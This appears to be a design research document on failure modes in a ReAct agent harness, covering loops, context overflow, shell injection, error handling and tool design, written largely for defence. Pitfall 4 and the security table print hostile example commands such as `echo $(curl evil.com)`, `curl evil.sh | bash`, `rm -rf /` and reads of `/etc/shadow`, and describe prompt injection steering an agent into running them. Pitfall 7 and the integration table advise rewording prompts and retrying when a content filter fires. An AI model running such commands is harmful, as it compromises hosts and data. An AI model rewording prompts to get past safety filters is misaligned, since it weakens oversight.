# Pitfalls Research

**Domain:** ReAct AI Agent Framework with Harness Engineering
**Researched:** 2026-05-27
**Confidence:** HIGH (synthesized from production post-mortems, framework RFCs, and real-world incident reports)

## Critical Pitfalls

### Pitfall 1: Infinite Agent Loop (Agent Stuck in Repetitive Tool Calls)

**What goes wrong:**
The agent calls the same tool repeatedly with nearly identical parameters, receiving nearly identical observations, yet continues reasoning instead of terminating. The context window fills with redundant iterations, latency spikes, and the agent burns through token budgets without making progress. In severe cases, the loop is only broken by hard budget exhaustion or manual intervention.

**Why it happens:**
- The agent lacks working memory of "what I have already tried" -- each loop iteration is self-contained, so the LLM cannot distinguish between "trying again" and "trying something different."
- Token probability collapse: the model's output distribution narrows as context grows, self-reinforcing the same reasoning path (LlamaIndex documented production outages from this exact cause).
- The agent does not receive a metacognitive signal that it is looping. Every individual step appears "reasonable" in isolation.
- Early ReAct implementations lack loop detection at the harness level -- they trust the model to self-terminate, which the model fundamentally cannot do.

**Consequences:**
- Token budget exhaustion (both input and output limits)
- Context window saturation, which further degrades reasoning quality
- User-facing hangs or silent failures
- Cost explosion from wasted API calls

**How to avoid:**
- Implement harness-level loop detection: track the last N tool calls, parameter hashes, and observation summaries. If the same tool is called with the same parameter pattern 3+ times without new evidence, trigger intervention.
- Inject a metacognitive prompt: "You have called the same tool with similar parameters multiple times. Here is what you have already learned: [summary]. Try a different approach or conclude."
- Enforce tool diversity limits: after N calls to the same tool (configurable, default 3-5), block further calls to that tool and force the agent to choose a different one.
- Implement a maximum step budget with graceful degradation (simple: hard stop after K steps; better: reduce context and inject guidance at K-3 steps).
- Use a Verifier component that independently checks whether the goal state has changed, rather than trusting the agent's self-assessment.

**Warning signs:**
- Token usage per step remains flat or increases while information gain approaches zero
- Tool parameter hashes show near-identical values across consecutive calls
- Observation summaries contain the same information across multiple steps
- Agent's conclusions contain no new evidence compared to 3 steps prior
- Response latency per step increases as context grows (LLM attention degrades)

**Phase to address:**
Phase 1 (Core ReAct Loop) must include basic loop detection. Phase 2 (Resilience) must harden it with classification-based intervention strategies and the Verifier.

---

### Pitfall 2: Context Window Overflow Without Graceful Degradation

**What goes wrong:**
Tool outputs, intermediate reasoning, and conversation history accumulate unchecked. Context grows past the LLM's effective working capacity, causing reasoning quality to collapse silently. The agent either hits the hard token limit (API returns 400) or, worse, produces increasingly incoherent outputs while consuming resources.

Research shows that at approximately 32K tokens (for a 128K context window model -- well before the hard limit), most models drop below 50% accuracy on retrieval and reasoning tasks. Furthermore, 78% of sessions exhibit state pollution after 5 loop cycles when context is not managed.

**Why it happens:**
- Developers dump the full tool output (raw HTML, JSON blobs, log files) into the context without summarization or truncation.
- Developers include the entire conversation history verbatim in every LLM call, creating a compounding growth problem.
- Many frameworks do not auto-summarize mid-loop. The OpenAI Agents SDK, for example, explicitly does not -- it throws a `BadRequestError` when context exceeds the window.
- The failure mode is silent: the LLM does not say "I am overwhelmed by context" -- it just produces worse results.

**Consequences:**
- Reasoning quality degrades progressively and invisibly
- Critical information from early steps is "squeezed out" of the attention window
- API calls fail with `context_length_exceeded` at unpredictable points
- Tool results from many steps ago are forgotten, leading to contradictory conclusions
- Token costs continue to rise while output quality declines

**How to avoid:**
- Implement a pre-LLM-call context compaction pipeline:
  1. Truncate tool outputs to a maximum per-call size (e.g., 2000 tokens per tool result)
  2. Remove stale intermediate history after a configurable window (e.g., keep only the last 3-5 tool rounds)
  3. Summarize old tool results: replace "raw tool output" with "one-sentence summary of finding"
  4. Use LLM-driven summarization as the last resort (expensive but effective)
- Target 75% of the context window as the compaction threshold, not 100%. The model needs headroom for reasoning
- Monitor context utilization as a real-time metric and surface it in the UI
- Implement preemptive overflow detection: after each tool-result compaction, re-estimate context size. If still > 90% of window, trigger a full LLM-based session compaction (max 3 compaction attempts to prevent infinite compaction loops)
- Store the compaction trigger count in the agent state to detect compaction-loops

**Warning signs:**
- Token usage per step grows monotonically without leveling off
- LLM responses become increasingly vague or contradictory
- The agent repeats information from early steps as if discovering it anew
- API error rate for `context_length_exceeded` increases
- Response latency per step grows disproportionately

**Phase to address:**
Phase 3 (Context Engineering) is dedicated to this. Phase 1 must include at minimum a hard token budget and tool output size limits (even if simplistic) to prevent catastrophic failure.

---

### Pitfall 3: Message Structure Corruption (Broken Tool Call/Response Alternation)

**What goes wrong:**
The ReAct loop depends on a strict alternating message structure: Assistant proposes tool call -> Tool result -> Assistant summarizes -> Tool call -> ... When this structure breaks, the LLM suffers from logical hallucinations: it invents fake tool results to fill gaps, enters infinite recursion trying to match orphaned tool calls with missing responses, or refuses to continue altogether.

Research documents a 23% format error rate in string-parsed ReAct systems over 100 consecutive calls. After 5 loop cycles, 78% of sessions exhibit state pollution severe enough to produce wrong results.

**Why it happens:**
- Concurrency without ordering guarantees: the LLM emits multiple tool calls, but results return out of order, and the framework has no `tool_call_id` matching mechanism.
- Message truncation during context management: a naive compaction strategy deletes a ToolMessage but leaves the preceding Assistant tool call message, creating an orphaned tool call.
- Forced user interruption mid-loop: a user message inserted between an assistant's tool call and the expected tool response breaks the alternation pattern.
- The model outputs malformed tool calls (wrong JSON, missing required fields) that the parser cannot extract.

**Consequences:**
- Logical hallucination: the model fabricates a tool result that looks plausible but is entirely made up
- Infinite recursion: the model detects "tool call with no response" and re-issues the same call, looping forever
- API rejection: modern aligned models (GPT-4, Claude) enforce message structure constraints -- an AIMessage containing tool_calls without a following ToolMessage causes API-side rejection
- Causal inversion: observations from a prior tool call are attributed to the wrong tool, producing incorrect conclusions
- Silent data corruption: the agent proceeds with fabricated or misattributed inputs

**How to avoid:**
- Always use `tool_call_id` matching to pair tool results with their originating calls. Discard results that do not match an active tool call.
- When compacting context, always delete paired message groups (Assistant tool call + corresponding ToolMessage). Never delete one without the other.
- Implement a message structure validator that runs before every LLM call: check the alternation pattern, detect orphaned tool calls, and repair or truncate the history if corruption is found.
- When user messages interrupt the loop, insert a synthetic "system continuation" message that tells the model the previous tool calls are aborted and it should start fresh.
- Use structured tool call formats (OpenAI-compatible function calling, JSON schema) instead of string-parsed `Action:`/`Action Input:` formats. This eliminates parsing errors as a failure class.

**Warning signs:**
- LLM responses that reference tool results that were never actually produced
- Repeated identical tool calls without intermediate observations
- API errors about invalid message structure or missing tool responses
- Abrupt topic shifts that suggest the model is bridging a broken narrative
- The agent makes confident statements about data that was never queried

**Phase to address:**
Phase 1 (Core ReAct Loop) must enforce message alternation structure. Phase 3 (Observability) should surface message structure violations in the UI.

---

### Pitfall 4: Bash Tool Injection and Sandbox Escape

**What goes wrong:**
The Bash tool is implemented as `subprocess.run(command, shell=True)` where `command` is a string constructed by the LLM. Shell metacharacters in the command string bypass naive allowlist checks. An attacker (or prompt injection from uncontrolled input) can execute arbitrary commands on the host system -- reading sensitive files, exfiltrating data, modifying system state, or establishing persistence.

Real-world incidents have demonstrated full system compromise via agent tool execution:
- Shell metacharacters (`$(...)`, `|`, `` ` ``, `<(...)`, `-exec`) allow arbitrary code execution even when the first token is allowlisted
- Sandbox escape via absolute paths: `cat /etc/shadow`, `ln -s /etc/shadow /workspace/`
- Prompt injection in documents leads the agent to construct and execute malicious commands

**Why it happens:**
- Developers use string-based command construction (`bash -c "$command"`) because it is the simplest path. Array-based execution (`subprocess.run([cmd, arg1, arg2])`) requires more careful argument formatting.
- Allowlist checks only examine the first whitespace-delimited token, missing that `echo $(curl evil.com)` passes the `echo` check while executing a subshell.
- The framework delegates safety to the model ("the LLM will not construct dangerous commands") rather than implementing harness-level security boundaries.
- Sandboxing is treated as optional or post-MVP, leaving the system exposed during early development.
- Sensitive environment variables (`SSH_AUTH_SOCK`, `GPG_AGENT_INFO`, `DBUS_SESSION_BUS_ADDRESS`) are accessible to the subprocess, enabling credential theft.

**Consequences:**
- Full system compromise via prompt injection
- Data exfiltration (reading `/etc/passwd`, environment variables, credentials)
- Destructive file operations (`rm -rf /`, `dd if=/dev/zero of=/dev/sda`)
- Supply chain attacks (agent runs `curl evil.sh | bash`)
- Legal and compliance liability from data breaches

**How to avoid:**
- **NEVER use `shell=True`** in Python's `subprocess.run` for LLM-generated commands. Use `subprocess.run([command, arg1, arg2], shell=False)`. This is the single most impactful safety measure.
- Implement a command-level allowlist that parses the **full command pipeline**, not just the first token:
  - Use `shlex.split()` to properly tokenize the command
  - Reject any command containing shell metacharacters (`|`, `;`, `&&`, `||`, `$`, `` ` ``, `>`, `<`, `*`, `?`, `[`, `]`, `~`, `!`, `#`)
  - Reject any command with absolute paths outside an allowlist (e.g., only allow `/usr/bin/` executables in addition to PATH lookups)
- Container-level isolation: run all Bash tool commands inside a Docker container or sandbox (bubblewrap on Linux, sandbox-exec on macOS)
- Unset sensitive environment variables before spawning the subprocess
- Implement capability-based command classification (from the `safer` pattern):
  - `--dw` (data-write): edits, commits, installs -- requires confirmation
  - `--dd` (data-delete): `rm`, `rmdir`, `mv` to trash -- requires explicit confirmation
  - `--ee` (env-ephemeral): `docker restart`, `systemctl restart`
  - `--ep` (env-persistent): `terraform apply`, `apt install` -- requires elevated approval
- For the disk cleanup demo specifically: wrap dangerous operations (rm, dd, mkfs) in a confirmation mechanism that requires a second LLM call or user confirmation before execution.
- Scan external content (documents, URLs) before the agent acts on them -- prompt injection in tool inputs is a primary attack vector.

**Warning signs:**
- Any use of `shell=True` in the codebase (grep for this regularly)
- Commands containing shell metacharacters being executed by the agent
- The agent reading files outside the defined workspace
- Network connections initiated by tools that should be read-only local operations
- Spikes in outbound traffic from the agent process

**Phase to address:**
Phase 1 (Core ReAct Loop) -- implement from day one. Never defer shell execution safety. This is not "production hardening" -- it is a fundamental design constraint that affects how the entire tool execution layer is architected.

---

### Pitfall 5: Undifferentiated Error Handling (All Errors Treated Equally)

**What goes wrong:**
Every tool failure is handled the same way: return the error string to the LLM and let the model figure it out. This naive approach fails because different error classes require fundamentally different recovery strategies, and the LLM is poorly equipped to distinguish them without harness-level classification.

Measured data shows:
- 8% of tool calls fail outright (timeout, network error, server error)
- 30% fail due to parameter errors (wrong types, missing fields, out-of-range values)
- 35% fail due to tool selection errors (wrong tool for the task)
- 12% fail because context overflow causes the model to misread tool descriptions

When all errors return the same format, the model retries parameter errors indefinitely (which will never succeed without human correction), misses transient errors that would succeed on retry, and wastes context on error text instead of recovery.

**Why it happens:**
- The harness treats the LLM as a black box that can handle any input including raw error messages
- Developers categorize all errors as "the tool failed" without considering the type of failure
- Error messages from subprocesses and APIs are passed through verbatim rather than classified and summarized
- There is no retry strategy differentiation -- all get either "always retry" or "never retry"

**Consequences:**
- Repeated retries of permanent errors (parameter validation, permission denied) waste tokens and frustrate users
- Transient errors (timeouts, 503s) are not retried, causing unnecessary failures
- The context window fills with error messages, degrading reasoning quality for subsequent steps
- Error cascades: a failed tool call produces a confusing error, the LLM misinterprets it and calls another tool with wrong parameters, compounding the failure
- The agent never escalates to the user or an alternative approach

**How to avoid:**
- Implement error classification in the harness before returning results to the LLM:

| Error Category | Examples | Retry? | Recovery Strategy |
|----------------|----------|--------|-------------------|
| Transient | Timeout, 502/503, rate limit (429) | Yes | Exponential backoff + jitter, max 3 retries |
| Parameter | Type error, missing field, out of range | No | Return structured error to LLM: "parameter X should be Y, here is the correct format" |
| Permission | Permission denied, unauthorized | No | Return permission context to LLM, suggest alternative tool |
| Resource | Not found, already deleted | No | Return "X not found" to LLM, suggest checking existence first |
| Internal | Tool crashed, memory error | Maybe | Circuit breaker: retry once, if fails again, mark tool as degraded and escalate |

- Format error results with structured fields: `{status, error_type, user_message, llm_message, suggested_action}` -- where `llm_message` contains guidance for the model on how to correct or proceed
- Implement a circuit breaker: if a tool fails N consecutive times, stop calling it and escalate to the fallback path
- For Phase 2 (Resilience): implement the full Recovery Ladder pattern:
  1. First failure: automatic retry
  2. Second failure: try a different approach (different tool, different parameters)
  3. Third failure: gracefully degrade -- return known information, suggest alternatives, or escalate to user
- Never pass raw exception tracebacks or subprocess stderr directly to the LLM -- summarize and classify first

**Warning signs:**
- The same tool call fails repeatedly with identical parameter errors
- Agent responses contain raw Python tracebacks or shell error messages
- The context window has multiple entries of the form "Error: [identical error text]"
- Steps-to-completion grows linearly or super-linearly with number of tool calls
- The agent enters a cycle of: call tool -> error -> try different tool -> error -> try original tool -> error

**Phase to address:**
Phase 2 (Resilience) is the dedicated phase for this. Phase 1 must include basic error classification (at minimum: transient vs. permanent) to prevent catastrophic error cascades.

---

### Pitfall 6: Non-Idempotent Tool Executions (Duplicate Side Effects on Retry)

**What goes wrong:**
A tool call succeeds, but the response is lost (timeout on the response channel, network blip, harness crash). The harness retries the call, and the side effect happens twice: a file is created twice, a record is inserted twice, a disk cleanup operation runs twice on the same files. The system enters an inconsistent state.

**Why it happens:**
- Tools are designed with no idempotency guarantees. The harness assumes "call once, succeed once."
- Timeout handling is asymmetric: the harness cannot distinguish between "the tool did not execute" and "the tool executed but the result was lost."
- Stateful operations (writes, deletions, mutations) are retried with no deduplication mechanism.
- The harness state (which tool calls have been executed) is maintained in memory and lost on crash.

**Consequences:**
- Duplicate file creations, duplicate API calls, duplicate database records
- Disk cleanup operations deleting files that were already deleted (error-prone in rm scenarios)
- Inconsistent system state after recovery
- Loss of user trust when side effects compound unexpectedly
- Hard-to-debug heisenbugs that only manifest under failure conditions

**How to avoid:**
- Assign every tool call a unique idempotency key (e.g., `tool_call_id + agent_run_id + timestamp_millis`).
- Maintain a **call registry** in the harness -- a persistent record of every tool call and its outcome. Before executing a tool, check the registry: if the same idempotency key exists with a completed status, skip execution and return the cached result.
- For the disk cleanup domain specifically:
  - Operations like `rm` should be "check-then-act": first verify the file exists, then delete, then verify it is gone
  - Report "already deleted" for files that no longer exist instead of returning an error
  - Use `shred` / secure delete for sensitive files (only when explicitly requested)
- Classify tools as idempotent-safe vs. idempotent-unsafe:
  - Idempotent-safe (reads, queries, listings): free retry
  - Idempotent-unsafe (writes, deletes, mutations): track in call registry, require confirmation for retry
- Never silently retry stateful operations. If a stateful operation needs retry, notify the LLM and let it reason about whether retry is appropriate.

**Warning signs:**
- Duplicate files or records appearing in the target system
- Tool call failure count exceeds success count but operations still appear to execute
- Disk space decreasing faster than expected during cleanup operations
- "File not found" errors for files that were just deleted (indicates duplicate delete attempt)

**Phase to address:**
Phase 2 (Resilience) -- idempotency is a recovery prerequisite, not a Phase 4 concern. The call registry should be designed in Phase 1 (even as an in-memory structure) to avoid retrofitting.

---

### Pitfall 7: Missing Termination Conditions (Agent Runs Until Exhaustion)

**What goes wrong:**
The agent loop has no well-defined termination conditions. It runs until it hits a hard budget limit (max steps, max tokens, max cost) and then returns whatever partial or incoherent state it is in. The user gets either a timeout error or a context-overflow-truncated response, with no indication of what was accomplished or what was left incomplete.

**Why it happens:**
- Developers focus on making the loop work (tool calling, observation processing) and add termination conditions as an afterthought.
- The termination logic is embedded in the LLM prompt ("decide when you are done") rather than in the harness.
- The LLM has conflicting incentives: it wants to be helpful, so it keeps working. It has no intrinsic "done" signal.
- There is no budget-aware degradation: when approaching limits, the agent does not shift to "wrap up and summarize" mode.

**Consequences:**
- Users receive partial results with no warning
- Token budgets are exhausted on non-critical steps while critical findings are lost
- The agent's final response is truncated mid-thought
- Long-running tasks are killed without checkpoint, losing all progress
- The agent cannot communicate "I could not complete the task because [reason]" -- it just stops

**How to avoid:**
- Implement a three-tier termination system:

1. **Goal met**: independent Verifier component checks whether the original goal conditions have been satisfied, not whether the agent thinks it is done. Return results with completion summary.

2. **Goal unachievable**: if the same sub-goal fails 3 times via different approaches, or if the agent calls 5+ tools with no progress toward the goal, classify as "cannot complete." Terminate with a useful summary: what was tried, what was learned, and what needs human intervention.

3. **Budget exhaustion warning**: when the agent reaches 80% of its step/token budget, inject a system message: "You have approximately 20% of your budget remaining. Summarize your findings and conclude if you cannot make a final determination." This prevents hard truncation.

- Separate "done" from "out of budget":
  - `finish_reason: "stop"` -> agent genuinely concluded (run Verifier)
  - `finish_reason: "length"` -> output was truncated (retry with higher max_tokens or request summary)
  - `finish_reason: "content_filter"` -> safety filter triggered (record and retry with modified prompt)
  - Budget exhausted -> always return "partial results" message, never an empty response

- Persist checkpoints at major steps (phase transitions, critical decisions) so work is not lost if the agent is terminated and later restarted.

**Warning signs:**
- Agent responses that end mid-sentence or with trailing punctuation
- The agent never explicitly says "done" or "completed"
- Step count always hits the maximum limit (suggests termination logic is missing)
- Final responses that say "based on the information gathered so far" (hedging language)
- Token usage consistently at or near the hard limit

**Phase to address:**
Phase 1 (Core ReAct Loop) -- the loop must have termination conditions before it has tool execution. Without termination, the loop is not a loop but an infinite spiral. Phase 4 (Memory) adds checkpointing for long-running tasks.

---

### Pitfall 8: Tool Selection Ambiguity (More Than 5 Tools Degrades Accuracy)

**What goes wrong:**
When an agent has more than 5 tools available, the LLM's tool selection accuracy drops sharply. The model confuses similar tools, picks the wrong one for the task, or spends context cycles re-reading tool descriptions. Measured data shows tool selection accuracy drops from 88% (with structured descriptions for <=5 tools) to approximately 62% (with 10+ tools described in flat text).

**Why it happens:**
- Tool descriptions are too similar ("search files" vs. "search directories" vs. "search file contents").
- All tools are presented in a flat list. The LLM must compare every tool description for every decision, which is O(n) in context attention.
- Tool descriptions emphasize *what* the tool does but not *when* to use it (and critically, *when not* to use it).
- The LLM has no mechanism to ask "which tool should I use?" -- it must guess.

**Consequences:**
- Wrong tool calls waste steps and tokens
- The agent uses a hammer when it needs a screwdriver, gets a confusing result, and wastes more steps trying to interpret it
- Tool descriptions consume significant context space (especially with 10+ tools having detailed docs)
- The LLM hallucinates tool names that are close to but not exactly real tool names
- The agent calls tools that are inappropriate for the situation, producing errors that cascade

**How to avoid:**
- Implement tool routing layers:
  - Layer 1: classify the user's request into a category (read-only diagnostics, write/modify, search, etc.)
  - Layer 2: present only the tools relevant to that category (2-3 tools per category)
  - This reduces the decision space from O(n) to O(log n) and improves accuracy from 62% to 96%

- For each tool, include:
  - **When to use:** specific scenarios and signals that indicate this tool is appropriate
  - **When NOT to use:** counter-indications (this is often more important and is almost always missing)
  - **Example call:** a complete, valid example
  - **Typical output:** what the result looks like and how to interpret it

- Keep the total tool count visible to the LLM at any decision point to at most 5-7.
- If more tools are needed, group them hierarchically and use a router tool that returns the subset.
- For the disk cleanup domain: group tools by risk level (read-only diagnostics, safe operations, dangerous operations). Only present dangerous operation tools when the agent has a specific reason to use them and after user confirmation.

**Warning signs:**
- Tool descriptions exceed approximately 20% of the system prompt
- The agent calls the wrong tool and then immediately calls a different tool that would have been the right first choice
- Multiple tools with overlapping functionality ("get_disk_usage" vs. "check_disk_space" vs. "df_report")
- The system prompt includes explicit "here are all N tools" with no grouping
- Agent enters error loops where tool X fails, agent switches to tool Y which also fails, then back to tool X

**Phase to address:**
Phase 1 (Core ReAct Loop) -- tool registration and description design. The tool count limit should be enforced from the first tool addition, not fixed later.

---

### Pitfall 9: State Loss Across Error Recovery (No Memory of What Went Wrong)

**What goes wrong:**
An error occurs during a retry or recovery cycle. The harness restarts the agent from a previous checkpoint or from scratch. The new execution has no memory of what already failed, so it repeats the same mistakes -- calling the same tool with the same parameters, getting the same error, retrying the same way. This creates an infinite error-recovery loop.

This is a documented production issue in Azure DevOps agents and LangGraph deployments.

**Why it happens:**
- The LLM session is stateless -- each new invocation starts with the system prompt + conversation history. If error context is not in the history, the model has no memory of it.
- Checkpoints only store "happy path" state (tool results, agent messages) but not "failure path" state (what failed, why, what was tried).
- Recovery consists of "retry from the last successful step" which inevitably leads to the same failure.
- The harness has no concept of a "failure registry" -- a persistent log of what has already been attempted and what the result was.

**Consequences:**
- Infinite error-retry loops that waste tokens and time
- The agent never learns from its mistakes because the mistakes are erased on retry
- Users see the agent making the same wrong decision repeatedly
- Token budget is consumed by repeated failures with no progress
- Debugging becomes impossible because the failure history is not preserved

**How to avoid:**
- Maintain a **failure registry** that persists across retries and checkpoints:
  ```
  {
    "tool": "cleanup_files",
    "parameters": {"path": "/tmp/old_logs"},
    "attempts": [
      {"time": "2026-05-27T10:30:00Z", "error": "Permission denied", "resolution": null},
      {"time": "2026-05-27T10:30:05Z", "error": "Permission denied", "resolution": null}
    ],
    "status": "failed",
    "advice_for_llm": "This tool cannot access /tmp/old_logs due to permission restrictions. Try using the list_files tool first to verify permissions, or suggest the user run with elevated privileges."
  }
  ```
- Include the failure registry in the context when retrying: "You previously tried these 3 approaches, which all failed because [reasons]. Do not attempt them again."
- Maintain a "do not repeat" list of (tool_name, parameter_hash) pairs that the agent has exhausted.
- In the disk cleanup domain: track which directories have been checked, which cleanup operations have been performed, and which were skipped. Prevent the agent from re-checking or re-cleaning.
- After the 3rd failure on a sub-goal, escalate to the user with a structured summary: "I tried [approach] which failed because [reason]. I tried [alternative] which failed because [reason]. I need your input to proceed."

**Warning signs:**
- Logs show the same tool call pattern repeating across retry attempts
- Recovery checkpoint loading is followed by the same error within 2-3 steps
- The failure count for a specific tool and parameter combination exceeds 3
- Agent responses do not reference previous failures during recovery
- Token consumption per recovered session is similar to the original failed session (suggests no learning)

**Phase to address:**
Phase 2 (Resilience) -- the failure registry is a core Resilience component. Phase 1 must include at minimum a step count and attempt tracking per tool call to prevent infinite retries.

---

### Pitfall 10: Tool Design That Produces Undigestible Outputs

**What goes wrong:**
Tools return raw, unprocessed outputs that the LLM must parse and interpret. A tool that queries disk usage returns `df -h` output verbatim, with whitespace formatting, multi-line output, and columns that the LLM must structurally understand. The LLM spends reasoning tokens parsing output instead of reasoning about the result. Worse, the LLM may misinterpret the output structure and draw incorrect conclusions.

**Why it happens:**
- "The tool works" is evaluated as "the shell command returned successfully" rather than "the LLM can easily use the tool's output."
- Developers assume the LLM can handle any text format because it is a language model.
- Tool implementations are added as thin wrappers around commands without output processing.
- There is no structured output contract between the tool and the agent -- just "a string came back."

**Consequences:**
- Increased token consumption: parsing a 50-line `df` output adds 500+ tokens of context for 20 tokens of useful information
- Misinterpretation: the LLM reads a number from the wrong column, or misparses a multi-line entry, producing wrong conclusions
- Inconsistent parsing: different LLM calls may interpret the same output differently
- Error cascades: a misinterpreted tool output leads to wrong parameters for the next tool call
- Hard-to-debug "reasoning" errors: the LLM appears to reason correctly but started from bad data

**How to avoid:**
- Every tool should have a **structured output contract**: return `{status, summary, data, raw_output}` where:
  - `status`: `"success" | "warning" | "error"` -- machine-readable status
  - `summary`: 1-2 sentence human/LLM-readable summary of the result (max 200 chars)
  - `data`: structured data (dict, list) for programmatic use
  - `raw_output`: only included when requested, for debugging
- Implement a **post-processor** for every tool: take the raw command output, extract the structured data, generate the summary. Never pass raw output as the primary return.
- For the disk cleanup domain specifically:

```python
# Bad: raw df output
def check_disk_usage():
    result = subprocess.run(["df", "-h", "/"], capture_output=True, text=True)
    return result.stdout
# Returns: "Filesystem      Size  Used Avail Use% Mounted on\n/dev/sda1       100G   80G   20G  80% /"

# Good: structured output with summary
def check_disk_usage():
    result = subprocess.run(["df", "-h", "/"], capture_output=True, text=True)
    parsed = parse_df_output(result.stdout)
    return {
        "status": "success",
        "summary": f"Disk is at {parsed.use_percent}% capacity ({parsed.used_gb}G used of {parsed.size_gb}G total)",
        "data": parsed,
        "raw_output": result.stdout  # Optional, for debugging
    }
```

- Include `next_actions` in the output contract for tools that are part of a diagnostic workflow: "Given this output, you might want to check the largest directories with `find_large_directories`."
- Test tool outputs with the actual LLM you will use to ensure they are interpretable.

**Warning signs:**
- Tool outputs include shell formatting (columns, headers, ANSI codes)
- Tool outputs are multi-line without clear structure
- Multiple agent steps are spent re-requesting the same information in different formats
- The agent asks follow-up questions that should have been answered by the tool output
- Raw error messages appear in the agent's reasoning trace

**Phase to address:**
Phase 1 (Core ReAct Loop) -- tool design must include output contracts from the first tool implementation. This is not refactorable -- changing output format later breaks every agent that depends on parsing.

---

## Technical Debt Patterns

Shortcuts that seem reasonable but create long-term problems.

| Shortcut | Immediate Benefit | Long-term Cost | When Acceptable |
|----------|-------------------|----------------|-----------------|
| `shell=True` for Bash tool | Works in one line, no argument parsing | Full system compromise on prompt injection | **Never** |
| Raw tool output passed to LLM | No post-processing needed | +40% token waste, misinterpretation risk, error cascades | Early prototyping only (must fix before demo) |
| All errors returned to LLM as strings | Simplest error path | 8% failure rate becomes 30% due to unclassified retries | **Never** -- classify from day one |
| Full conversation history in every context | No compaction logic needed | Context saturation at 5-10 cycles, reasoning collapse | Up to 3 tool calls (then must implement compaction) |
| Single max_tokens for all LLM calls | Simple configuration | Output truncation at critical moments, wasted tokens on simple responses | **Never** -- tune per call type |
| Tool descriptions as flat text list | Easy to add tools, no routing infrastructure | Accuracy collapse at >5 tools | Up to 3 tools, must implement grouping before adding more |
| Retry = repeat same call | Simple loop | Idempotency failures, duplicate side effects, infinite loops | Read-only tools only |
| In-memory agent state | Fast, simple, no DB needed | All state lost on crash, no recovery possible | Acceptable for Phase 1 demo; must persist before user testing |
| No output truncation for tool results | Complete data available | Context window fills with one tool call, rest of agent breaks | Acceptable if tool output is always <200 tokens; else never |
| Trust model for termination | Simple loop implementation | Infinite loops, token budget exhaustion, user frustration | **Never** -- termination must be in the harness |

---

## Integration Gotchas

Common mistakes when connecting to external services.

| Integration | Common Mistake | Correct Approach |
|-------------|----------------|------------------|
| OpenAI/LLM API | Not handling `finish_reason: "length"` -- assumes model finished | Check `finish_reason`; if length, retry with higher max_tokens or request summary completion |
| OpenAI/LLM API | Not handling `finish_reason: "content_filter"` -- silent failure | Record filter trigger, modify prompt to avoid filtered content, retry once |
| OpenAI/LLM API | Passing raw conversation history without validating alternation structure | Validate message alternation (tool_call must have corresponding tool_result) before every API call |
| Docker sandbox | Mounting the host filesystem into the container | Use minimal mounts, read-only mounts for tools that only need to read |
| Docker sandbox | Running container as root inside (host root by default) | Use `--user` flag, read-only root filesystem, dropped capabilities |
| File system operations | Checking existence before delete (TOCTOU race) | Use `os.remove()` with error handling instead of `os.path.exists() + os.remove()` |
| subprocess | Not setting `timeout` on subprocess calls | Every subprocess call must have a timeout (default to 30s, tune per tool) |
| subprocess | Not closing pipes, leading to deadlocked processes | Use `subprocess.run()` (waits for completion) not `subprocess.Popen()` (unless streaming) |
| Logging | Logging sensitive data (API keys, file paths, user data) to console or files | Implement structured logging with PII redaction; never log tool parameters for write/delete operations |
| Error recovery | Reconnecting to LLM API without backoff | Implement exponential backoff with jitter for all API retries |

---

## Performance Traps

Patterns that work at small scale but fail as usage grows.

| Trap | Symptoms | Prevention | When It Breaks |
|------|----------|------------|----------------|
| Full conversation history in every request | Per-step token cost grows linearly with step count, reasoning quality degrades | Context compaction/summarization after N steps | 5-10 steps (30K+ total tokens) |
| Synchronous tool calls (one at a time) | Wall-clock time grows linearly with number of tools | Parallel tool calls for independent operations | 3+ sequential tool calls |
| No tool output size limits | One large tool response fills the context window, breaking subsequent calls | Per-tool max output size (truncate or summarize after 2000 tokens) | One `cat large_file` or `find /` call |
| Flat tool list in system prompt | System prompt grows with each tool added, consuming context | Tool routing / hierarchical tool selection | 5-7 tools |
| Retry with linear backoff | API rate limit errors pile up under load | Exponential backoff with jitter | Under concurrent usage (>2 simultaneous agents) |
| Unbounded agent step count | Agent runs for 50+ steps, context grows, quality degrades | Hard step limit (configurable) + soft warning | 15-20 steps |
| Checking disk usage with `df` on every cycle | Repeated `df` calls on every diagnostic step | Cache `df` results with TTL | 2+ `df` calls within 60 seconds |
| No intermediate result caching | Agent re-queries the same information when context is compacted | Per-session cache of tool results by (tool_name, parameters_hash) | After context compaction causes information loss |

---

## Security Mistakes

Domain-specific security issues beyond general web security.

| Mistake | Risk | Prevention |
|---------|------|------------|
| `shell=True` in subprocess calls | Full system compromise via command injection | Always use `shell=False`, pass command as array |
| First-token-only command allowlisting | Bypass via subshell (`$(...)`), pipe (`|`), process substitution (`<(...)`) | Parse full command, block shell metacharacters, or use exec-array execution |
| No sandbox for tool execution | Arbitrary file read/write, system modification | Docker/bubblewrap sandbox for all commands |
| Sensitive env vars passed to subprocess | Credential theft via `env`, `cat /proc/self/environ` | Unset `SSH_AUTH_SOCK`, `GPG_AGENT_INFO`, `DBUS_SESSION_BUS_ADDRESS` before subprocess |
| Tool output includes sensitive data | API keys, tokens, passwords visible in agent context | Filter tool outputs for known secret patterns before returning to LLM |
| No rate limiting on tool calls | Resource exhaustion (fork bomb, disk fill, network flood) | Per-tool rate limiter, max calls per minute |
| Tool timeout set too high | Hanging subprocesses accumulate, resource leak | Maximum timeout per tool category (diagnostic: 30s, write: 60s, cleanup: 120s) |
| No confirmation for dangerous operations | Accidental or injected destructive commands | Confirmation gate for write/delete tools: "rm /var/log/* requires confirmation: are you sure? (y/N)" |
| Prompt injection in tool inputs | Attacker-controlled content in tool parameters triggers malicious commands | Validate and sanitize all tool inputs; scan for prompt injection patterns |
| Agent output shown to user without validation | Agent hallucinates harmful instructions to the user | Confidence check before displaying agent conclusions; flag low-confidence findings |

---

## UX Pitfalls

Common user experience mistakes in this domain.

| Pitfall | User Impact | Better Approach |
|---------|-------------|-----------------|
| No thinking trace display | User sees tool calls without context, cannot follow agent reasoning | Show thought process alongside tool calls (transparent streaming) |
| Agent runs silently for a long time | User has no idea what is happening, assumes it is broken | Stream thinking status: "checking disk usage..." -> "found large log files" -> "proposing cleanup plan" |
| No confirmation for destructive actions | User clicks "run cleanup" and files disappear without review | Provide a preview of what will be deleted, ask for confirmation, show undo plan |
| Tool errors shown as raw tracebacks | User sees Python exceptions or shell errors, loses confidence | Translate errors to user-friendly messages: "Could not read that file (permission denied)" not `PermissionError: [Errno 13]` |
| No progress indication | User does not know if the agent is making progress or stuck | Step counter, progress bar, "step 3 of 8" indicator |
| Agent goes back and forth | User sees agent reconsidering decisions, appears indecisive | Consolidate reasoning improvements; show only significant state transitions |
| Final answer buries the lead | User must read through the full trace to find the conclusion | Always provide a concise summary at the top or end, separate from the reasoning trace |
